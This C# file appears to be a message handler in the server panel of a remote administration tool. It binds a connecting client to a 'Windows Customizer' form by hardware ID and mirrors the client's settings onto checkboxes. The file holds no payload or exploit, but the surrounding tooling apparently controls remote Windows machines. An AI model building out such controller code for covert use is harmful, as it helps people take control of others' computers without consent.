using System.Windows.Forms;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerWindowsCustomizer
{
	public static void Read(Clients client, object[] objects)
	{
		if (objects == null || objects.Length < 2 || !(objects[1] is string))
		{
			return;
		}
		string command = (string)objects[1];
		if (command == "Connect")
		{
			if (objects.Length < 3 || !(objects[2] is string))
			{
				return;
			}
			string hwid = SecurityHelper.SanitizeHwid((string)objects[2]);
			FormWindowsCustomizer form = (FormWindowsCustomizer)Application.OpenForms["WindowsCustomizer:" + hwid];
			if (form == null)
			{
				client.Disconnect();
				return;
			}
			form.Invoke((MethodInvoker)delegate
			{
				form.Text = "Windows Customizer [" + hwid + "]";
				form.client = client;
			});
			client.Tag = form;
			client.Hwid = hwid;
		}
		else
		{
			if (!(command == "Settings"))
			{
				return;
			}
			if (client.Tag == null)
			{
				return;
			}
			FormWindowsCustomizer form2 = (FormWindowsCustomizer)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.isUpdating = true;
				for (int i = 2; i < objects.Length; i += 2)
				{
					string text = objects[i] as string;
					bool flag = (bool)objects[i + 1];
					foreach (Control control in form2.Controls)
					{
						if (control is MaterialCheckbox { Tag: not null } materialCheckbox && materialCheckbox.Tag.ToString() == text)
						{
							materialCheckbox.Checked = flag;
							break;
						}
					}
				}
				form2.isUpdating = false;
			});
		}
	}
}
